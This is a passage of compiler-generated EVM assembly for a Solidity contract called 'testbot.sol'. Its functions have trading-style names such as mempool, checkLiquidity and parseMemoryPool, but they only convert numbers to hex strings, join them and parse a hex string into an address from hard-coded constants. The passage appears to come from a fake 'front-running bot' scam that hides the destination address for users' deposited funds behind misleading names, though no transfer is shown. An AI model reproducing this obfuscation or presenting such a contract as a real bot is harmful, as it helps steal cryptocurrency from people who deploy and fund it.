*/\ntag_85:\n    /* \"testbot.sol\":7672:7743  if ((b2 >= 48) && (b2 <= 57)) {... */\n  iszero\n  tag_86\n  jumpi\n    /* \"testbot.sol\":7726:7728  48 */\n  0x30\n    /* \"testbot.sol\":7720:7728  b2 -= 48 */\n  dup3\n  tag_87\n  swap2\n  swap1\n  tag_68\n  jump\t// in\ntag_87:\n  swap2\n  pop\n    /* \"testbot.sol\":7672:7743  if ((b2 >= 48) && (b2 <= 57)) {... */\ntag_86:\n    /* \"testbot.sol\":7595:7743  if ((b2 >= 65) && (b2 <= 70)) {... */\ntag_84:\n    /* \"testbot.sol\":7517:7743  if ((b2 >= 97) && (b2 <= 102)) {... */\ntag_80:\n    /* \"testbot.sol\":7776:7778  b2 */\n  dup2\n    /* \"testbot.sol\":7771:7773  16 */\n  0x10\n    /* \"testbot.sol\":7766:7768  b1 */\n  dup5\n    /* \"testbot.sol\":7766:7773  b1 * 16 */\n  tag_88\n  swap2\n  swap1\n  tag_57\n  jump\t// in\ntag_88:\n    /* \"testbot.sol\":7766:7778  b1 * 16 + b2 */\n  tag_89\n  swap2\n  swap1\n  tag_90\n  jump\t// in\ntag_89:\n    /* \"testbot.sol\":7756:7779  iaddr += (b1 * 16 + b2) */\n  dup5\n  tag_91\n  swap2\n  swap1\n  tag_90\n  jump\t// in\ntag_91:\n  swap4\n  pop\n    /* \"testbot.sol\":7149:7150  2 */\n  0x02\n    /* \"testbot.sol\":7144:7150  i += 2 */\n  dup2\n  tag_92\n  swap2\n  swap1\n  tag_62\n  jump\t// in\ntag_92:\n  swap1\n  pop\n    /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n  jump(tag_53)\ntag_54:\n  pop\n    /* \"testbot.sol\":7814:7819  iaddr */\n  dup3\n    /* \"testbot.sol\":7799:7820  return address(iaddr) */\n  swap5\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":6899:7827  function parseMemoryPool(... */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"testbot.sol\":7833:7922  function mempoolLayer() internal pure returns (bytes4) {... */\ntag_16:\n    /* \"testbot.sol\":7880:7886  bytes4 */\n  0x00\n    /* \"testbot.sol\":7905:7915  0xfd7e4d80 */\n  0xfd7e4d80\n    /* \"testbot.sol\":7898:7915  return 0xfd7e4d80 */\n  0xe0\n  shl\n  swap1\n  pop\n    /* \"testbot.sol\":7833:7922  function mempoolLayer() internal pure returns (bytes4) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":5019:5106  function getMemPoolOffset() internal pure returns (uint) {... */\ntag_27:\n    /* \"testbot.sol\":5070:5074  uint */\n  0x00\n    /* \"testbot.sol\":5093:5099  322258 */\n  0x04ead2\n    /* \"testbot.sol\":5086:5099  return 322258 */\n  swap1\n  pop\n    /* \"testbot.sol\":5019:5106  function getMemPoolOffset() internal pure returns (uint) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":5112:5199  function getMemPoolLength() internal pure returns (uint) {... */\ntag_29:\n    /* \"testbot.sol\":5163:5167  uint */\n  0x00\n    /* \"testbot.sol\":5186:5192  187591 */\n  0x02dcc7\n    /* \"testbot.sol\":5179:5192  return 187591 */\n  swap1\n  pop\n    /* \"testbot.sol\":5112:5199  function getMemPoolLength() internal pure returns (uint) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":5205:5292  function getMemPoolHeight() internal pure returns (uint) {... */\ntag_31:\n    /* \"testbot.sol\":5256:5260  uint */\n  0x00\n    /* \"testbot.sol\":5279:5285  829371 */\n  0x0ca7bb\n    /* \"testbot.sol\":5272:5285  return 829371 */\n  swap1\n  pop\n    /* \"testbot.sol\":5205:5292  function getMemPoolHeight() internal pure returns (uint) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":5298:5384  function getMemPoolDepth() internal pure returns (uint) {... */\ntag_33:\n    /* \"testbot.sol\":5348:5352  uint */\n  0x00\n    /* \"testbot.sol\":5371:5377  796950 */\n  0x0c2916\n    /* \"testbot.sol\":5364:5377  return 796950 */\n  swap1\n  pop\n    /* \"testbot.sol\":5298:5384  function getMemPoolDepth() internal pure returns (uint) {... */\n  swap1\n  jump\t// out\n    /* \"testbot.sol\":4023:5013  function checkLiquidity(uint a) internal pure returns (string memory) {... */\ntag_36:\n    /* \"testbot.sol\":4078:4091  string memory */\n  0x60\n    /* \"testbot.sol\":4103:4113  uint count */\n  0x00\n    /* \"testbot.sol\":4127:4133  uint b */\n  dup1\n    /* \"testbot.sol\":4136:4137  a */\n  dup4\n    /* \"testbot.sol\":4127:4137  uint b = a */\n  swap1\n  pop\n    /* \"testbot.sol\":4147:4215  while (b != 0) {... */\ntag_99:\n    /* \"testbot.sol\":4159:4160  0 */\n  0x00\n    /* \"testbot.sol\":4154:4155  b */\n  dup2\n    /* \"testbot.sol\":4154:4160  b != 0 */\n  eq\n    /* \"testbot.sol\":4147:4215  while (b != 0) {... */\n  tag_100\n  jumpi\n    /* \"testbot.sol\":4176:4183  count++ */\n  dup2\n  dup1\n  tag_101\n  swap1\n  tag_102\n  jump\t// in\ntag_101:\n  swap3\n  pop\n  pop\n    /* \"testbot.sol\":4202:4204  16 */\n  0x10\n    /* \"testbot.sol\":4197:4204  b /= 16 */\n  dup2\n  tag_103\n  swap2\n  swap1\n  tag_104\n  jump\t// in\ntag_103:\n  swap1\n  pop\n    /* \"testbot.sol\":4147:4215  while (b != 0) {... */\n  jump(tag_99)\ntag_100:\n    /* \"testbot.sol\":4224:4240  bytes memory res */\n  0x00\n    /* \"testbot.sol\":4253:4258  count */\n  dup3\n    /* \"testbot.sol\":4243:4259  new bytes(count) */\n  0xffffffffffffffff\n  dup2\n  gt\n  iszero\n  tag_105\n  jumpi\n  tag_106\n  tag_107\n  jump\t// in\ntag_106:\ntag_105:\n  mload(0x40)\n  swap1\n  dup1\n  dup3\n  mstore\n  dup1\n  0x1f\n  add\n  not(0x1f)\n  and\n  0x20\n  add\n  dup3\n  add\n  0x40\n  mstore\n  dup1\n  iszero\n  tag_108\n  jumpi\n  dup2\n  0x20\n  add\n  0x01\n  dup3\n  mul\n  dup1\n  calldatasize\n  dup4\n  calldatacopy\n  dup1\n  dup3\n  add\n  swap2\n  pop\n  pop\n  swap1\n  pop\ntag_108:\n  pop\n    /* \"testbot.sol\":4224:4259  bytes memory res = new bytes(count) */\n  swap1\n  pop\n    /* \"testbot.sol\":4274:4280  uint i */\n  0x00\n    /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\ntag_109:\n    /* \"testbot.sol\":4290:4295  count */\n  dup4\n    /* \"testbot.sol\":4286:4287  i */\n  dup2\n    /* \"testbot.sol\":4286:4295  i < count */\n  lt\n    /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\n  iszero\n  tag_110\n  jumpi\n    /* \"testbot.sol\":4324:4326  16 */\n  0x10\n    /* \"testbot.sol\":4320:4321  a */\n  dup7\n    /* \"testbot.sol\":4320:4326  a % 16 */\n  tag_112\n  swap2\n  swap1\n  tag_113\n  jump\t// in\ntag_112:\n    /* \"testbot.sol\":4316:4326  b = a % 16 */\n  swap3\n  pop\n    /* \"testbot.sol\":4361:4381  toHexDigit(uint8(b)) */\n  tag_114\n    /* \"testbot.sol\":4378:4379  b */\n  dup4\n    /* \"testbot.sol\":4361:4371  toHexDigit */\n  shl(0x20, tag_115)\n    /* \"testbot.sol\":4361:4381  toHexDigit(uint8(b)) */\n  0x20\n  shr\n  jump\t// in\ntag_114:\n    /* \"testbot.sol\":4340:4343  res */\n  dup3\n    /* \"testbot.sol\":4356:4357  1 */\n  0x01\n    /* \"testbot.sol\":4352:4353  i */\n  dup4\n    /* \"testbot.sol\":4344:4349  count */\n  dup8\n    /* \"testbot.sol\":4344:4353  count - i */\n  tag_116\n  swap2\n  swap1\n  tag_117\n  jump\t// in\ntag_116:\n    /* \"testbot.sol\":4344:4357  count - i - 1 */\n  tag_118\n  swap2\n  swap1\n  tag_117\n  jump\t// in\ntag_118:\n    /* \"testbot.sol\":4340:4358  res[count - i - 1] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_119\n  jumpi\n  tag_120\n  tag_60\n  jump\t// in\ntag_120:\ntag_119:\n  0x20\n  add\n  add\n    /* \"testbot.sol\":4340:4381  res[count - i - 1] = toHexDigit(uint8(b)) */\n  swap1\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  swap1\n  dup2\n  0x00\n  byte\n  swap1\n  mstore8\n  pop\n    /* \"testbot.sol\":4400:4402  16 */\n  0x10\n    /* \"testbot.sol\":4395:4402  a /= 16 */\n  dup7\n  tag_121\n  swap2\n  swap1\n  tag_104\n  jump\t// in\ntag_121:\n  swap6\n  pop\n    /* \"testbot.sol\":4297:4300  ++i */\n  dup1\n  tag_122\n  swap1\n  tag_102\n  jump\t// in\ntag_122:\n  swap1\n  pop\n    /* \"testbot.sol\":4269:4413  for (uint i = 0; i < count; ++i) {... */\n  jump(tag_109)\ntag_110:\n  pop\n    /* \"testbot.sol\":4422:4436  uint hexLength */\n  0x00\n    /* \"testbot.sol\":4452:4455  res */\n  dup2\n    /* \"testbot.sol\":4439:4464  bytes(string(res)).length */\n  mload\n    /* \"testbot.sol\":4422:4464  uint hexLength = bytes(string(res)).length */\n  swap1\n  pop\n    /* \"testbot.sol\":4491:4492  4 */\n  0x04\n    /* \"testbot.sol\":4478:4487  hexLength */\n  dup2\n    /* \"testbot.sol\":4478:4492  hexLength == 4 */\n  sub\n    /* \"testbot.sol\":4474:4978  if (hexLength == 4) {... */\n  tag_123\n  jumpi\n    /* \"testbot.sol\":4508:4528  string memory _hexC1 */\n  0x00\n    /* \"testbot.sol\":4531:4556  mempool(\"0\", string(res)) */\n  tag_124\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x01\n  dup2\n  mstore\n  0x20\n  add\n  0x3000000000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"testbot.sol\":4551:4554  res */\n  dup5\n    /* \"testbot.sol\":4531:4538  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":4531:4556  mempool(\"0\", string(res)) */\n  0x20\n  shr\n  jump\t// in\ntag_124:\n    /* \"testbot.sol\":4508:4556  string memory _hexC1 = mempool(\"0\", string(res)) */\n  swap1\n  pop\n    /* \"testbot.sol\":4577:4583  _hexC1 */\n  dup1\n    /* \"testbot.sol\":4570:4583  return _hexC1 */\n  swap6\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  jump(tag_98)\n    /* \"testbot.sol\":4474:4978  if (hexLength == 4) {... */\ntag_123:\n    /* \"testbot.sol\":4617:4618  3 */\n  0x03\n    /* \"testbot.sol\":4604:4613  hexLength */\n  dup2\n    /* \"testbot.sol\":4604:4618  hexLength == 3 */\n  sub\n    /* \"testbot.sol\":4600:4978  if (hexLength == 3) {... */\n  tag_126\n  jumpi\n    /* \"testbot.sol\":4634:4654  string memory _hexC2 */\n  0x00\n    /* \"testbot.sol\":4657:4683  mempool(\"00\", string(res)) */\n  tag_127\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x02\n  dup2\n  mstore\n  0x20\n  add\n  0x3030000000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"testbot.sol\":4678:4681  res */\n  dup5\n    /* \"testbot.sol\":4657:4664  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":4657:4683  mempool(\"00\", string(res)) */\n  0x20\n  shr\n  jump\t// in\ntag_127:\n    /* \"testbot.sol\":4634:4683  string memory _hexC2 = mempool(\"00\", string(res)) */\n  swap1\n  pop\n    /* \"testbot.sol\":4704:4710  _hexC2 */\n  dup1\n    /* \"testbot.sol\":4697:4710  return _hexC2 */\n  swap6\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  jump(tag_98)\n    /* \"testbot.sol\":4600:4978  if (hexLength == 3) {... */\ntag_126:\n    /* \"testbot.sol\":4744:4745  2 */\n  0x02\n    /* \"testbot.sol\":4731:4740  hexLength */\n  dup2\n    /* \"testbot.sol\":4731:4745  hexLength == 2 */\n  sub\n    /* \"testbot.sol\":4727:4978  if (hexLength == 2) {... */\n  tag_129\n  jumpi\n    /* \"testbot.sol\":4761:4781  string memory _hexC3 */\n  0x00\n    /* \"testbot.sol\":4784:4811  mempool(\"000\", string(res)) */\n  tag_130\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x03\n  dup2\n  mstore\n  0x20\n  add\n  0x3030300000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"testbot.sol\":4806:4809  res */\n  dup5\n    /* \"testbot.sol\":4784:4791  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":4784:4811  mempool(\"000\", string(res)) */\n  0x20\n  shr\n  jump\t// in\ntag_130:\n    /* \"testbot.sol\":4761:4811  string memory _hexC3 = mempool(\"000\", string(res)) */\n  swap1\n  pop\n    /* \"testbot.sol\":4832:4838  _hexC3 */\n  dup1\n    /* \"testbot.sol\":4825:4838  return _hexC3 */\n  swap6\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  jump(tag_98)\n    /* \"testbot.sol\":4727:4978  if (hexLength == 2) {... */\ntag_129:\n    /* \"testbot.sol\":4872:4873  1 */\n  0x01\n    /* \"testbot.sol\":4859:4868  hexLength */\n  dup2\n    /* \"testbot.sol\":4859:4873  hexLength == 1 */\n  sub\n    /* \"testbot.sol\":4855:4978  if (hexLength == 1) {... */\n  tag_132\n  jumpi\n    /* \"testbot.sol\":4889:4909  string memory _hexC4 */\n  0x00\n    /* \"testbot.sol\":4912:4940  mempool(\"0000\", string(res)) */\n  tag_133\n  mload(0x40)\n  dup1\n  0x40\n  add\n  0x40\n  mstore\n  dup1\n  0x04\n  dup2\n  mstore\n  0x20\n  add\n  0x3030303000000000000000000000000000000000000000000000000000000000\n  dup2\n  mstore\n  pop\n    /* \"testbot.sol\":4935:4938  res */\n  dup5\n    /* \"testbot.sol\":4912:4919  mempool */\n  shl(0x20, tag_38)\n    /* \"testbot.sol\":4912:4940  mempool(\"0000\", string(res)) */\n  0x20\n  shr\n  jump\t// in\ntag_133:\n    /* \"testbot.sol\":4889:4940  string memory _hexC4 = mempool(\"0000\", string(res)) */\n  swap1\n  pop\n    /* \"testbot.sol\":4961:4967  _hexC4 */\n  dup1\n    /* \"testbot.sol\":4954:4967  return _hexC4 */\n  swap6\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  jump(tag_98)\n    /* \"testbot.sol\":4855:4978  if (hexLength == 1) {... */\ntag_132:\n    /* \"testbot.sol\":5002:5005  res */\n  dup2\n    /* \"testbot.sol\":4988:5006  return string(res) */\n  swap5\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":4023:5013  function checkLiquidity(uint a) internal pure returns (string memory) {... */\ntag_98:\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"testbot.sol\":2483:3148  function mempool(... */\ntag_38:\n    /* \"testbot.sol\":2588:2601  string memory */\n  0x60\n    /* \"testbot.sol\":2613:2636  bytes memory _baseBytes */\n  0x00\n    /* \"testbot.sol\":2645:2650  _base */\n  dup4\n    /* \"testbot.sol\":2613:2651  bytes memory _baseBytes = bytes(_base) */\n  swap1\n  pop\n    /* \"testbot.sol\":2661:2685  bytes memory _valueBytes */\n  0x00\n    /* \"testbot.sol\":2694:2700  _value */\n  dup4\n    /* \"testbot.sol\":2661:2701  bytes memory _valueBytes = bytes(_value) */\n  swap1\n  pop\n    /* \"testbot.sol\":2712:2735  string memory _tmpValue */\n  0x00\n    /* \"testbot.sol\":2782:2793  _valueBytes */\n  dup2\n    /* \"testbot.sol\":2782:2800  _valueBytes.length */\n  mload\n    /* \"testbot.sol\":2762:2772  _baseBytes */\n  dup4\n    /* \"testbot.sol\":2762:2779  _baseBytes.length */\n  mload\n    /* \"testbot.sol\":2762:2800  _baseBytes.length + _valueBytes.length */\n  tag_135\n  swap2\n  swap1\n  tag_62\n  jump\t// in\ntag_135:\n    /* \"testbot.sol\":2738:2810  new string(... */\n  0xffffffffffffffff\n  dup2\n  gt\n  iszero\n  tag_136\n  jumpi\n  tag_137\n  tag_107\n  jump\t// in\ntag_137:\ntag_136:\n  mload(0x40)\n  swap1\n  dup1\n  dup3\n  mstore\n  dup1\n  0x1f\n  add\n  not(0x1f)\n  and\n  0x20\n  add\n  dup3\n  add\n  0x40\n  mstore\n  dup1\n  iszero\n  tag_138\n  jumpi\n  dup2\n  0x20\n  add\n  0x01\n  dup3\n  mul\n  dup1\n  calldatasize\n  dup4\n  calldatacopy\n  dup1\n  dup3\n  add\n  swap2\n  pop\n  pop\n  swap1\n  pop\ntag_138:\n  pop\n    /* \"testbot.sol\":2712:2810  string memory _tmpValue = new string(... */\n  swap1\n  pop\n    /* \"testbot.sol\":2820:2842  bytes memory _newValue */\n  0x00\n    /* \"testbot.sol\":2851:2860  _tmpValue */\n  dup2\n    /* \"testbot.sol\":2820:2861  bytes memory _newValue = bytes(_tmpValue) */\n  swap1\n  pop\n    /* \"testbot.sol\":2872:2878  uint i */\n  0x00\n    /* \"testbot.sol\":2888:2894  uint j */\n  dup1\n    /* \"testbot.sol\":2914:2915  0 */\n  0x00\n    /* \"testbot.sol\":2910:2915  i = 0 */\n  swap2\n  pop\n    /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\ntag_139:\n    /* \"testbot.sol\":2921:2931  _baseBytes */\n  dup6\n    /* \"testbot.sol\":2921:2938  _baseBytes.length */\n  mload\n    /* \"testbot.sol\":2917:2918  i */\n  dup3\n    /* \"testbot.sol\":2917:2938  i < _baseBytes.length */\n  lt\n    /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\n  iszero\n  tag_140\n  jumpi\n    /* \"testbot.sol\":2976:2986  _baseBytes */\n  dup6\n    /* \"testbot.sol\":2987:2988  i */\n  dup3\n    /* \"testbot.sol\":2976:2989  _baseBytes[i] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_142\n  jumpi\n  tag_143\n  tag_60\n  jump\t// in\ntag_143:\ntag_142:\n  0x20\n  add\n  add\n  mload\n  0xf8\n  shr\n  0xf8\n  shl\n    /* \"testbot.sol\":2959:2968  _newValue */\n  dup4\n    /* \"testbot.sol\":2969:2972  j++ */\n  dup3\n  dup1\n  tag_144\n  swap1\n  tag_102\n  jump\t// in\ntag_144:\n  swap4\n  pop\n    /* \"testbot.sol\":2959:2973  _newValue[j++] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_145\n  jumpi\n  tag_146\n  tag_60\n  jump\t// in\ntag_146:\ntag_145:\n  0x20\n  add\n  add\n    /* \"testbot.sol\":2959:2989  _newValue[j++] = _baseBytes[i] */\n  swap1\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  swap1\n  dup2\n  0x00\n  byte\n  swap1\n  mstore8\n  pop\n    /* \"testbot.sol\":2940:2943  i++ */\n  dup2\n  dup1\n  tag_147\n  swap1\n  tag_102\n  jump\t// in\ntag_147:\n  swap3\n  pop\n  pop\n    /* \"testbot.sol\":2905:3000  for (i = 0; i < _baseBytes.length; i++) {... */\n  jump(tag_139)\ntag_140:\n    /* \"testbot.sol\":3019:3020  0 */\n  0x00\n    /* \"testbot.sol\":3015:3020  i = 0 */\n  swap2\n  pop\n    /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\ntag_148:\n    /* \"testbot.sol\":3026:3037  _valueBytes */\n  dup5\n    /* \"testbot.sol\":3026:3044  _valueBytes.length */\n  mload\n    /* \"testbot.sol\":3022:3023  i */\n  dup3\n    /* \"testbot.sol\":3022:3044  i < _valueBytes.length */\n  lt\n    /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\n  iszero\n  tag_149\n  jumpi\n    /* \"testbot.sol\":3082:3093  _valueBytes */\n  dup5\n    /* \"testbot.sol\":3094:3095  i */\n  dup3\n    /* \"testbot.sol\":3082:3096  _valueBytes[i] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_151\n  jumpi\n  tag_152\n  tag_60\n  jump\t// in\ntag_152:\ntag_151:\n  0x20\n  add\n  add\n  mload\n  0xf8\n  shr\n  0xf8\n  shl\n    /* \"testbot.sol\":3065:3074  _newValue */\n  dup4\n    /* \"testbot.sol\":3075:3078  j++ */\n  dup3\n  dup1\n  tag_153\n  swap1\n  tag_102\n  jump\t// in\ntag_153:\n  swap4\n  pop\n    /* \"testbot.sol\":3065:3079  _newValue[j++] */\n  dup2\n  mload\n  dup2\n  lt\n  tag_154\n  jumpi\n  tag_155\n  tag_60\n  jump\t// in\ntag_155:\ntag_154:\n  0x20\n  add\n  add\n    /* \"testbot.sol\":3065:3096  _newValue[j++] = _valueBytes[i] */\n  swap1\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  swap1\n  dup2\n  0x00\n  byte\n  swap1\n  mstore8\n  pop\n    /* \"testbot.sol\":3046:3049  i++ */\n  dup2\n  dup1\n  tag_156\n  swap1\n  tag_102\n  jump\t// in\ntag_156:\n  swap3\n  pop\n  pop\n    /* \"testbot.sol\":3010:3107  for (i = 0; i < _valueBytes.length; i++) {... */\n  jump(tag_148)\ntag_149:\n    /* \"testbot.sol\":3131:3140  _newValue */\n  dup3\n    /* \"testbot.sol\":3117:3141  return string(_newValue) */\n  swap7\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n  pop\n    /* \"testbot.sol\":2483:3148  function mempool(... */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"testbot.sol\":3484:3813  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\ntag_115:\n    /* \"testbot.sol\":3536:3542  bytes1 */\n  0x00\n    /* \"testbot.sol\":3563:3564  d */\n  dup2\n    /* \"testbot.sol\":3558:3564  0 <= d */\n  0xff\n  and\n    /* \"testbot.sol\":3558:3559  0 */\n  0x00\n    /* \"testbot.sol\":3558:3564  0 <= d */\n  gt\n  iszero\n    /* \"testbot.sol\":3558:3574  0 <= d && d <= 9 */\n  dup1\n  iszero\n  tag_158\n  jumpi\n  pop\n    /* \"testbot.sol\":3573:3574  9 */\n  0x09\n    /* \"testbot.sol\":3568:3569  d */\n  dup3\n    /* \"testbot.sol\":3568:3574  d <= 9 */\n  0xff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":3558:3574  0 <= d && d <= 9 */\ntag_158:\n    /* \"testbot.sol\":3554:3749  if (0 <= d && d <= 9) {... */\n  iszero\n  tag_159\n  jumpi\n    /* \"testbot.sol\":3625:3626  d */\n  dup2\n    /* \"testbot.sol\":3610:3621  bytes1(\"0\") */\n  0x3000000000000000000000000000000000000000000000000000000000000000\n    /* \"testbot.sol\":3604:3622  uint8(bytes1(\"0\")) */\n  0xf8\n  shr\n    /* \"testbot.sol\":3604:3626  uint8(bytes1(\"0\")) + d */\n  tag_160\n  swap2\n  swap1\n  tag_161\n  jump\t// in\ntag_160:\n    /* \"testbot.sol\":3597:3627  bytes1(uint8(bytes1(\"0\")) + d) */\n  0xf8\n  shl\n    /* \"testbot.sol\":3590:3627  return bytes1(uint8(bytes1(\"0\")) + d) */\n  swap1\n  pop\n  jump(tag_157)\n    /* \"testbot.sol\":3554:3749  if (0 <= d && d <= 9) {... */\ntag_159:\n    /* \"testbot.sol\":3660:3661  d */\n  dup2\n    /* \"testbot.sol\":3648:3662  10 <= uint8(d) */\n  0xff\n  and\n    /* \"testbot.sol\":3648:3650  10 */\n  0x0a\n    /* \"testbot.sol\":3648:3662  10 <= uint8(d) */\n  gt\n  iszero\n    /* \"testbot.sol\":3648:3680  10 <= uint8(d) && uint8(d) <= 15 */\n  dup1\n  iszero\n  tag_163\n  jumpi\n  pop\n    /* \"testbot.sol\":3678:3680  15 */\n  0x0f\n    /* \"testbot.sol\":3672:3673  d */\n  dup3\n    /* \"testbot.sol\":3666:3680  uint8(d) <= 15 */\n  0xff\n  and\n  gt\n  iszero\n    /* \"testbot.sol\":3648:3680  10 <= uint8(d) && uint8(d) <= 15 */\ntag_163:\n    /* \"testbot.sol\":3644:3749  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n  iszero\n  tag_164\n  jumpi\n    /* \"testbot.sol\":3735:3737  10 */\n  0x0a\n    /* \"testbot.sol\":3731:3732  d */\n  dup3\n    /* \"testbot.sol\":3716:3727  bytes1(\"a\") */\n  0x6100000000000000000000000000000000000000000000000000000000000000\n    /* \"testbot.sol\":3710:3728  uint8(bytes1(\"a\")) */\n  0xf8\n  shr\n    /* \"testbot.sol\":3710:3732  uint8(bytes1(\"a\")) + d */\n  tag_165\n  swap2\n  swap1\n  tag_161\n  jump\t// in\ntag_165:\n    /* \"testbot.sol\":3710:3737  uint8(bytes1(\"a\")) + d - 10 */\n  tag_166\n  swap2\n  swap1\n  tag_167\n  jump\t// in\ntag_166:\n    /* \"testbot.sol\":3703:3738  bytes1(uint8(bytes1(\"a\")) + d - 10) */\n  0xf8\n  shl\n    /* \"testbot.sol\":3696:3738  return bytes1(uint8(bytes1(\"a\")) + d - 10) */\n  swap1\n  pop\n  jump(tag_157)\n    /* \"testbot.sol\":3644:3749  if (10 <= uint8(d) && uint8(d) <= 15) {... */\ntag_164:\n    /* \"testbot.sol\":3798:3806  revert() */\n  0x00\n  dup1\n  revert\n    /* \"testbot.sol\":3484:3813  function toHexDigit(uint8 d) internal pure returns (bytes1) {... */\ntag_157:\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":7:176   */\ntag_168:\n    /* \"#utility.yul\":91:102   */\n  0x00\n    /* \"#utility.yul\":125:131   */\n  dup3\n    /* \"#utility.yul\":120:123   */\n  dup3\n    /* \"#utility.yul\":113:132   */\n  mstore\n    /* \"#utility.yul\":165:169   */\n  0x20\n    /* \"#utility.yul\":160:163   */\n  dup3\n    /* \"#utility.yul\":156:170   */\n  add\n    /* \"#utility.yul\":141:170   */\n  swap1\n  pop\n    /* \"#utility.yul\":7:176   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":182:486   */\ntag_169:\n    /* \"#utility.yul\":322:356   */\n  0x4f6e6c79206d61696e6e657420697320737570706f727465642e204f6e6c7920\n    /* \"#utility.yul\":318:319   */\n  0x00\n    /* \"#utility.yul\":310:316   */\n  dup3\n    /* \"#utility.yul\":306:320   */\n  add\n    /* \"#utility.yul\":299:357   */\n  mstore\n    /* \"#utility.yul\":391:425   */\n  0x6d61696e6e657420697320737570706f727465642e204f6e6c79206d61696e6e\n    /* \"#utility.yul\":386:388   */\n  0x20\n    /* \"#utility.yul\":378:384   */\n  dup3\n    /* \"#utility.yul\":374:389   */\n  add\n    /* \"#utility.yul\":367:426   */\n  mstore\n    /* \"#utility.yul\":460:478   */\n  0x657420697320737570706f727465642e00000000000000000000000000000000\n    /* \"#utility.yul\":455:457   */\n  0x40\n    /* \"#utility.yul\":447:453   */\n  dup3\n    /* \"#utility.yul\":443:458   */\n  add\n    /* \"#utility.yul\":436:479   */\n  mstore\n    /* \"#utility.yul\":182:486   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":492:858   */\ntag_170:\n    /* \"#utility.yul\":634:637   */\n  0x00\n    /* \"#utility.yul\":655:722   */\n  tag_191\n    /* \"#utility.yul\":719:721   */\n  0x50\n    /* \"#utility.yul\":714:717   */\n  dup4\n    /* \"#utility.yul\":655:722   */\n  tag_168\n  jump\t// in\ntag_191:\n    /* \"#utility.yul\":648:722   */\n  swap2\n  pop\n    /* \"#utility.yul\":731:824   */\n  tag_192\n    /* \"#utility.yul\":820:823   */\n  dup3\n    /* \"#utility.yul\":731:824   */\n  tag_169\n  jump\t// in\ntag_192:\n    /* \"#utility.yul\":849:851   */\n  0x60\n    /* \"#utility.yul\":844:847   */\n  dup3\n    /* \"#utility.yul\":840:852   */\n  add\n    /* \"#utility.yul\":833:852   */\n  swap1\n  pop\n    /* \"#utility.yul\":492:858   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":864:1283   */\ntag_6:\n    /* \"#utility.yul\":1030:1034   */\n  0x00\n    /* \"#utility.yul\":1068:1070   */\n  0x20\n    /* \"#utility.yul\":1057:1066   */\n  dup3\n    /* \"#utility.yul\":1053:1071   */\n  add\n    /* \"#utility.yul\":1045:1071   */\n  swap1\n  pop\n    /* \"#utility.yul\":1117:1126   */\n  dup2\n    /* \"#utility.yul\":1111:1115   */\n  dup2\n    /* \"#utility.yul\":1107:1127   */\n  sub\n    /* \"#utility.yul\":1103:1104   */\n  0x00\n    /* \"#utility.yul\":1092:1101   */\n  dup4\n    /* \"#utility.yul\":1088:1105   */\n  add\n    /* \"#utility.yul\":1081:1128   */\n  mstore\n    /* \"#utility.yul\":1145:1276   */\n  tag_194\n    /* \"#utility.yul\":1271:1275   */\n  dup2\n    /* \"#utility.yul\":1145:1276   */\n  tag_170\n  jump\t// in\ntag_194:\n    /* \"#utility.yul\":1137:1276   */\n  swap1\n  pop\n    /* \"#utility.yul\":864:1283   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1289:1415   */\ntag_171:\n    /* \"#utility.yul\":1326:1333   */\n  0x00\n    /* \"#utility.yul\":1366:1408   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":1359:1364   */\n  dup3\n    /* \"#utility.yul\":1355:1409   */\n  and\n    /* 